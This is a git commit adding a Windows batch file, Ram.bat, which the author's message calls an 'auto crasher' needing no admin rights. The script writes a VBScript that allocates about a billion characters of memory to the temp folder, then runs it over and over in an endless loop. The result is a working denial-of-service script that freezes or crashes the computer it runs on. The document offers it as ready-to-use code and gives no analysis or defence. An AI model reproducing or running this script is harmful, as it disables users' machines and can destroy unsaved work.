c6fd97380a9ea50028133f874f396c9945c1bd98
taylostolo <33434831+taylostolo@users.noreply.github.com>
2020-05-07 16:52:05 -0700

    Add files via upload
    there the batch file is the auto crasher no admin required I think

---
+++ Ram.bat
@@ -0,0 +1,12 @@
+@echo off
+>"%temp%\ramm.vbs" echo FreeMem = Space (1000000000)
+%temp%\ramm.vbs
+%temp%\ramm.vbs
+%temp%\ramm.vbs
+
+:somemore
+%temp%\ramm.vbs
+%temp%\ramm.vbs
+%temp%\ramm.vbs
+%temp%\ramm.vbs
+goto :somemore
